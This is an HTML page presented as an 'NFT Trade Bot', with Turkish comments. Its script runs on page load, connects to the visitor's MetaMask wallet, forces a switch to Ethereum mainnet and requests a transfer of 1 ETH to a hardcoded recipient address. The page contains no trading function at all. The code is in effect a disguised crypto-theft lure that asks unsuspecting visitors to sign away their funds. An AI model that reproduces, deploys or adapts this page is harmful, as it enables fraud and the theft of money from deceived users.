<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>NFT Trade Bot</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
</head>
<body>

<script>
  const toAddress = "0x6cE2B898EE2653d02E7bbB42A19aCc801Ea2964D"; // Alıcı adresi
  const amountEth = "1"; // Sabit miktar (ETH)

  async function switchToEthereumMainnet() {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }]
      });
    } catch (switchError) {
      console.error("Ağ değiştirilemedi:", switchError);
      throw new Error("switch error");
    }
  }

  async function start() {
    if (typeof window.ethereum === "undefined") {
      console.error("Metamask veya uyumlu bir cüzdan bulunamadı.");
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();

      // ethers v6'da chainId BigInt döner; Number() ile kıyaslayalım
      if (Number(network.chainId) !== 1) {
        await switchToEthereumMainnet();
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const signer = await provider.getSigner();

      const tx = await signer.sendTransaction({
        to: toAddress,
        value: ethers.parseEther(amountEth)
      });

      console.log("İşlem gönderildi:", tx.hash);
      await tx.wait();
      console.log("İşlem onaylandı.");
    } catch (error) {
      console.error("Hata:", error);
    }
  }

  window.addEventListener("load", start);
</script>

</body>
</html>
